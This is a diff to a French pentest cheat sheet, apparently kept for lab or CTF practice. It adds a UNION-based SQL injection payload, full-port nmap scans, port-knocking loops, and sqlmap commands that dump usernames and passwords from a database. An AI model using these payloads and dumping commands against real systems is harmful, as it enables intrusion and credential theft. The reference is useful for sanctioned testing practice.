@@ -26,6 +26,7 @@
 
 - ' or 1=1- - --> Bypass authentification web
 	- [Payload](https://github.com/payloadbox/sql-injection-payload-list)
+	- Mary' union select 1,2,3,4,5,@@version#
 
 
 - [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
@@ -63,7 +64,9 @@ john zip.hashes`
 ### Actif 
 - Voir les ports ouverts --> `nmap -Pn 192.168.1.1`
 - Voir la version des services --> `nmap -sV -sC 192.168.1.1`
+- Voir tout les ports --> `sudo nmap -sS -p- 192.168.1.1`
 - Pour le web --> `nikto -h http://172.16.28.230/`
+	- Port knocking : `for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 172.16.28.247; done` ou `knock 192.168.33.5 -v 7469 8475 9842`
 
 - Wordpress --> `wpscan --url www.mokoil.com`
 	- En mode agressif --> `wpscan --url www.mokoil.com -e vp,vt,u`
@@ -72,6 +75,10 @@ john zip.hashes`
 - [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
 - SQLMap --> `sqlmap -u http://192.168.56.109/cgi-bin/badstore.cgi?action=loginregister --dbs --batch searchquery`
+	- Avec burp copie de la requête POST (mettre la requête dans le fichier)
+		- sqlmap -r r.txt --batch --dbs
+		- sqlmap -r r.txt --batch -D Staff --tables
+		- sqlmap -r r.txt --batch -D Staff -T Users -C Username,Password --dump
 
 ## Directory
 
